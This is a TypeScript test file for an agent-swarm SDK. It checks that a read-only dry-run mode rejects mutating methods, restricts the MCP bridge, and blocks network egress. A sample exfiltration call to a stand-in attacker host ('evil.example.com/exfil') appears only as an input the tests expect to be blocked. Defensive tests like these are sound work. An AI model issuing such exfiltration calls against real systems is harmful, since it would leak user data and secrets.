import { afterEach, describe, expect, test } from "bun:test";
import type { SwarmConfigPayload } from "../scripts-runtime/executors/types";
import { patchFetchForReadOnly } from "../scripts-runtime/readonly-egress";
import { Redacted } from "../scripts-runtime/redacted";
import { SwarmConfig } from "../scripts-runtime/swarm-config";
import { createSwarmSdk } from "../scripts-runtime/swarm-sdk";

const payload: SwarmConfigPayload = {
  system: {
    apiKey: { value: "test-api-key", isSecret: true },
    agentId: { value: "agent-1", isSecret: false },
    mcpBaseUrl: { value: "http://localhost:3013", isSecret: false },
  },
  user: {
    "user-key": { value: "user-value", isSecret: true },
  },
};

describe("SwarmConfig", () => {
  test("hydrates system values as Redacted values with metadata", () => {
    const config = new SwarmConfig(payload);
    expect(Redacted.value(config.apiKey)).toBe("test-api-key");
    expect(Redacted.meta(config.apiKey)).toEqual({ type: "system", isSecret: true });
    expect(Redacted.value(config.agentId)).toBe("agent-1");
    expect(Redacted.meta(config.mcpBaseUrl)).toEqual({ type: "system", isSecret: false });
  });

  test("returns user-set config values", () => {
    const config = new SwarmConfig(payload);
    const value = config.get("user-key");
    expect(value).toBeDefined();
    expect(Redacted.value(value!)).toBe("user-value");
    expect(Redacted.meta(value!)).toEqual({ type: "user", isSecret: true });
  });

  test("missing user keys return undefined", () => {
    const config = new SwarmConfig(payload);
    expect(config.get("missing")).toBeUndefined();
  });

  test("readOnly defaults to false and is opt-in", () => {
    expect(new SwarmConfig(payload).readOnly).toBe(false);
    expect(
      new SwarmConfig({ ...payload, system: { ...payload.system, readOnly: true } }).readOnly,
    ).toBe(true);
  });
});

describe("read-only SDK surface (routing dry-run)", () => {
  const sdkFor = (readOnly: boolean) =>
    createSwarmSdk(
      new SwarmConfig(readOnly ? { ...payload, system: { ...payload.system, readOnly } } : payload),
    );

  test("rejects mutating methods in read-only mode", async () => {
    const swarm = sdkFor(true);
    for (const method of ["task_send", "slack_post", "config_set", "script_run", "task_poll"]) {
      await expect(swarm[method]({})).rejects.toThrow(/not available in read-only mode/);
    }
  });

  test("fails closed for unknown/new methods in read-only mode", async () => {
    const swarm = sdkFor(true);
    // A method added to the SDK later must be denied by default, not allowed.
    await expect(swarm.some_future_method({})).rejects.toThrow(/not available in read-only mode/);
  });

  test("does not gate anything when readOnly is unset", () => {
    // No rejection wrapper at all — the guard is strictly opt-in, so the normal
    // routing path is unaffected.
    expect(new SwarmConfig(payload).readOnly).toBe(false);
  });
});

describe("read-only network egress (routing dry-run)", () => {
  const ORIGINAL_FETCH = globalThis.fetch;
  afterEach(() => {
    globalThis.fetch = ORIGINAL_FETCH;
  });

  test("blocks egress to anything but the swarm API", async () => {
    patchFetchForReadOnly("http://localhost:3013");
    await expect(globalThis.fetch("https://evil.example.com/exfil")).rejects.toThrow(
      /blocked in read-only mode/,
    );
    // Credential stripping alone doesn't help against a handler that carries
    // its own token, which is why this layer exists.
    await expect(globalThis.fetch("https://hooks.slack.com/services/T/B/xxx")).rejects.toThrow(
      /blocked in read-only mode/,
    );
  });

  test("fails closed on an unparseable base URL", async () => {
    patchFetchForReadOnly("not a url");
    await expect(globalThis.fetch("http://localhost:3013/api/heartbeat")).rejects.toThrow(
      /blocked in read-only mode/,
    );
  });

  test("blocks same-origin writes and side-effectful reads, allows the read-only surface", async () => {
    const seen: string[] = [];
    globalThis.fetch = (async (input: Parameters<typeof fetch>[0]) => {
      seen.push(typeof input === "string" ? input : input instanceof URL ? input.href : input.url);
      return new Response("{}", { status: 200 });
    }) as typeof fetch;
    patchFetchForReadOnly("http://localhost:3013");

    // The origin check alone is not enough: a handler carrying its own auth
    // headers could write same-origin. Non-allowlisted method/path pairs must
    // be rejected.
    await expect(
      globalThis.fetch("http://localhost:3013/api/tasks/abc/cancel", { method: "POST" }),
    ).rejects.toThrow(/blocked in read-only mode/);
    await expect(
      globalThis.fetch("http://localhost:3013/api/kv/some-key", {
        method: "PUT",
        body: JSON.stringify({ value: 1 }),
      }),
    ).rejects.toThrow(/blocked in read-only mode/);
    // GET is not assumed safe: /api/poll claims a task, /api/config* returns
    // unmasked secrets.
    await expect(globalThis.fetch("http://localhost:3013/api/poll")).rejects.toThrow(
      /blocked in read-only mode/,
    );
    await expect(
      globalThis.fetch("http://localhost:3013/api/config/resolved?includeSecrets=true"),
    ).rejects.toThrow(/blocked in read-only mode/);

    // What the read-only SDK surface actually emits stays reachable.
    await globalThis.fetch("http://localhost:3013/api/tasks?status=unassigned");
    await globalThis.fetch("http://localhost:3013/api/internal-ai/classify", {
      method: "POST",
      body: JSON.stringify({ input: "x", labels: ["a", "b"] }),
    });
    expect(seen).toEqual([
      "http://localhost:3013/api/tasks?status=unassigned",
      "http://localhost:3013/api/internal-ai/classify",
    ]);
  });

  test("gates the generic MCP bridge on the read-only tool set", async () => {
    globalThis.fetch = (async () => new Response("{}", { status: 200 })) as typeof fetch;
    patchFetchForReadOnly("http://localhost:3013");

    const bridge = (body: string) =>
      globalThis.fetch("http://localhost:3013/api/mcp-bridge", { method: "POST", body });

    // The bridge executes arbitrary MCP tools by name, so the path alone
    // proves nothing — write tools and malformed bodies are rejected.
    await expect(bridge(JSON.stringify({ tool: "trigger-workflow", args: {} }))).rejects.toThrow(
      /blocked in read-only mode/,
    );
    await expect(bridge(JSON.stringify({ tool: "set-config", args: {} }))).rejects.toThrow(
      /blocked in read-only mode/,
    );
    await expect(bridge("not json")).rejects.toThrow(/blocked in read-only mode/);
    await expect(bridge(JSON.stringify({}))).rejects.toThrow(/blocked in read-only mode/);

    // Read-only bridge tools pass through.
    const ok = await bridge(JSON.stringify({ tool: "get-script-run", args: {} }));
    expect(ok.status).toBe(200);
  });
});
